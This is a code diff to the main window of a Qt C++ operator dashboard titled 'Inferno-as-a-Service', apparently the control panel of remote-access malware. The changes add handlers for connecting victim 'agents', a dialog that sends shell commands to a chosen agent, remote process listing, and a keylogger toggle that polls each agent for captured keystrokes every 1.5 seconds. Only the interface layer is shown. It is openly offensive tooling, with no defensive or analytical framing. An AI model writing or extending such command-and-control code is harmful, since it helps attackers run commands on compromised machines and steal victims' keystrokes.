@@ -1,5 +1,6 @@
 #include "../include/MainWindow.hpp"
 #include "../include/DataStreamWidget.hpp"
+#include "../include/CommandDialog.hpp"
 #include <QVBoxLayout>
 #include <QHBoxLayout>
 #include <QFile>
@@ -18,17 +19,32 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     setupUI();
     loadStyleSheet();
     
+    connect(m_server, &Server::agentConnected, this, &MainWindow::onAgentConnected);
+    connect(m_server, &Server::agentDisconnected, this, &MainWindow::onAgentDisconnected);
+    connect(m_server, &Server::shellOutputReceived, this, &MainWindow::onShellOutputReceived);
+    connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
     connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);
 
     // Animation Init
     m_radarAngle = 0;
     m_radarTimer = new QTimer(this);
     connect(m_radarTimer, &QTimer::timeout, this, &MainWindow::updateRadarAnimation);
+
+    m_keylogPollTimer = new QTimer(this);
+    connect(m_keylogPollTimer, &QTimer::timeout, this, &MainWindow::pollKeylogger);
 }
 
 void MainWindow::setupUI() {
     setWindowTitle("Inferno-as-a-Service | Operator Dashboard");
-    resize(1200, 800);
+    setMinimumSize(1200, 800);
+
+    // Initialize Core Widgets First to avoid Segfaults in connects
+    m_telemetryConsole = new QPlainTextEdit();
+    m_telemetryConsole->setReadOnly(true);
+    m_keylogStream = new QPlainTextEdit();
+    m_keylogStream->setReadOnly(true);
+    m_agentList = new QListWidget();
+    m_statusLabel = new QLabel(" SYSTEM READY");
 
     // Central Widget and Main Layout
     auto* centralWidget = new QWidget(this);
@@ -76,7 +92,9 @@ void MainWindow::setupUI() {
     agentHeader->addWidget(m_btnScan);
     agentLayout->addLayout(agentHeader);
     
-    m_agentList = new QListWidget();
+    m_agentList->setIconSize(QSize(24, 24));
+    m_agentList->setContextMenuPolicy(Qt::CustomContextMenu);
+    connect(m_agentList, &QListWidget::customContextMenuRequested, this, &MainWindow::showAgentContextMenu);
     agentLayout->addWidget(m_agentList);
     mainSplitter->addWidget(agentContainer);
 
@@ -93,6 +111,7 @@ void MainWindow::setupUI() {
     btnShell->setIcon(QIcon(":/icon_shell.png"));
     btnShell->setIconSize(QSize(32, 32));
     btnShell->setToolTip("Execute Shell");
+    connect(btnShell, &QPushButton::clicked, this, &MainWindow::executeShellCommand);
     
     auto* btnProcs = new QPushButton();
     btnProcs->setObjectName("iconButton");
@@ -100,13 +119,45 @@ void MainWindow::setupUI() {
     btnProcs->setIcon(QIcon(":/icon_refresh.png"));
     btnProcs->setIconSize(QSize(32, 32));
     btnProcs->setToolTip("Refresh Process List");
+    connect(btnProcs, &QPushButton::clicked, this, &MainWindow::requestProcessList);
+
+    auto* btnClearConsole = new QPushButton();
+    btnClearConsole->setObjectName("iconButton");
+    btnClearConsole->setFixedSize(40, 40);
+    btnClearConsole->setIcon(QIcon(":/icon_clear.png"));
+    btnClearConsole->setIconSize(QSize(32, 32));
+    btnClearConsole->setToolTip("Clear Console");
+    connect(btnClearConsole, &QPushButton::clicked, m_telemetryConsole, &QPlainTextEdit::clear);
 
     telemetryHeader->addWidget(btnShell);
     telemetryHeader->addWidget(btnProcs);
+    telemetryHeader->addWidget(btnClearConsole);
     telemetryLayout->addLayout(telemetryHeader);
-
-    m_telemetryConsole = new QPlainTextEdit();
-    m_telemetryConsole->setReadOnly(true);
+    
+    // Console Search Bar
+    auto* searchLayout = new QHBoxLayout();
+    m_searchBox = new QLineEdit();
+    m_searchBox->setPlaceholderText("Search telemetry...");
+    m_searchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
+    
+    auto* btnSearch = new QPushButton();
+    btnSearch->setFixedSize(30, 30);
+    btnSearch->setIcon(QIcon(":/icon_search.png"));
+    btnSearch->setObjectName("iconButton");
+    connect(btnSearch, &QPushButton::clicked, this, [this](){
+        m_telemetryConsole->find(m_searchBox->text());
+    });
+    
+    searchLayout->addWidget(m_searchBox);
+    searchLayout->addWidget(btnSearch);
+    telemetryLayout->addLayout(searchLayout);
+    
+    m_telemetryConsole->setContextMenuPolicy(Qt::CustomContextMenu);
+    connect(m_telemetryConsole, &QPlainTextEdit::customContextMenuRequested, this, [this](const QPoint& pos){
+        QMenu menu(this);
+        menu.addAction("Copy Selected", m_telemetryConsole, &QPlainTextEdit::copy);
+        menu.exec(m_telemetryConsole->mapToGlobal(pos));
+    });
     telemetryLayout->addWidget(m_telemetryConsole);
     mainSplitter->addWidget(telemetryContainer);
 
@@ -118,18 +169,16 @@ void MainWindow::setupUI() {
     keylogHeader->addStretch();
     
     m_btnKeylog = new QPushButton();
-    m_btnKeylog->setCheckable(true);
     m_btnKeylog->setObjectName("iconButton");
     m_btnKeylog->setFixedSize(40, 40);
     m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
     m_btnKeylog->setIconSize(QSize(32, 32));
+    m_btnKeylog->setCheckable(true);
     m_btnKeylog->setToolTip("Toggle Keylogger");
     connect(m_btnKeylog, &QPushButton::toggled, this, &MainWindow::toggleKeylogState);
     keylogHeader->addWidget(m_btnKeylog);
     keylogLayout->addLayout(keylogHeader);
 
-    m_keylogStream = new QPlainTextEdit();
-    m_keylogStream->setReadOnly(true);
     keylogLayout->addWidget(m_keylogStream);
     mainSplitter->addWidget(keylogContainer);
 
@@ -159,7 +208,17 @@ void MainWindow::loadStyleSheet() {
 
 // Slots implementation
 void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
-    m_agentList->addItem(ip + " [" + info + "]");
+    auto* item = new QListWidgetItem(ip + " [" + info + "]", m_agentList);
+    
+    QString lowerInfo = info.toLower();
+    if (lowerInfo.contains("windows")) {
+        item->setIcon(QIcon(":/os_win.png"));
+    } else if (lowerInfo.contains("linux")) {
+        item->setIcon(QIcon(":/os_linux.png"));
+    } else if (lowerInfo.contains("macos") || lowerInfo.contains("darwin") || lowerInfo.contains("apple")) {
+        item->setIcon(QIcon(":/os_mac.png"));
+    }
+    
     m_telemetryConsole->appendPlainText(QString("[SYSTEM] New connection established from %1").arg(ip));
     m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
 }
@@ -178,7 +237,16 @@ void MainWindow::onShellOutputReceived(const QString& ip, const QString& output)
 }
 
 void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
-    m_keylogStream->appendPlainText(QString("[%1] ").arg(ip));
+    if (data.trimmed().isEmpty()) return;
+
+    // Check if we need a new IP header (e.g. if previous line doesn't end with a burst from the same IP)
+    QString currentText = m_keylogStream->toPlainText();
+    bool needsHeader = currentText.isEmpty() || !currentText.endsWith(data) || !currentText.contains(ip);
+    
+    if (needsHeader) {
+        m_keylogStream->appendPlainText(QString("[%1] ").arg(ip));
+    }
+    
     m_keylogStream->insertPlainText(data);
     m_keylogStream->ensureCursorVisible();
 }
@@ -208,11 +276,68 @@ void MainWindow::updateRadarAnimation() {
 }
 
 void MainWindow::toggleKeylogState(bool active) {
+    QListWidgetItem* item = m_agentList->currentItem();
+    if (!item) return;
+    
+    QString agentIp = item->text().split(" ").first();
     if (active) {
         m_btnKeylog->setIcon(QIcon(":/icon_eye_open.png"));
+        m_server->toggleKeylogger(agentIp, true);
+        m_keylogPollTimer->start(1500); // Polling every 1.5s
     } else {
         m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
+        m_server->toggleKeylogger(agentIp, false);
+        m_keylogPollTimer->stop();
     }
+}
+
+void MainWindow::pollKeylogger() {
+    QListWidgetItem* item = m_agentList->currentItem();
+    if (!item) return;
+    
+    QString agentIp = item->text().split(" ").first();
+    m_server->requestKeylogDump(agentIp);
+}
+
+void MainWindow::showAgentContextMenu(const QPoint& pos) {
+    QListWidgetItem* item = m_agentList->itemAt(pos);
+    if (!item) return;
+
+    QMenu menu(this);
+    menu.addAction("Execute Shell...", this, &MainWindow::executeShellCommand);
+    menu.addAction("Refresh Processes", this, &MainWindow::requestProcessList);
+    menu.addSeparator();
+    menu.addAction("Disconnect Agent");
+    
+    menu.exec(m_agentList->mapToGlobal(pos));
+}
+
+void MainWindow::executeShellCommand() {
+    QListWidgetItem* item = m_agentList->currentItem();
+    if (!item) {
+        onStatusMessage("No agent selected for command");
+        return;
+    }
+
+    QString agentIp = item->text().split(" ").first();
+    
+    CommandDialog dlg(agentIp, this);
+    if (dlg.exec() == QDialog::Accepted) {
+        QString cmd = dlg.getCommand();
+        if (!cmd.isEmpty()) {
+            m_telemetryConsole->appendPlainText(QString("[LOCAL] Dispatching: %1").arg(cmd));
+            m_server->sendShellCommand(agentIp, cmd);
+        }
+    }
+}
+
+void MainWindow::requestProcessList() {
+     QListWidgetItem* item = m_agentList->currentItem();
+    if (!item) return;
+    
+    QString agentIp = item->text().split(" ").first();
+    m_telemetryConsole->appendPlainText(QString("[LOCAL] Requesting Process List from %1").arg(agentIp));
+    m_server->requestProcessList(agentIp);
 }
 
 } // namespace inferno
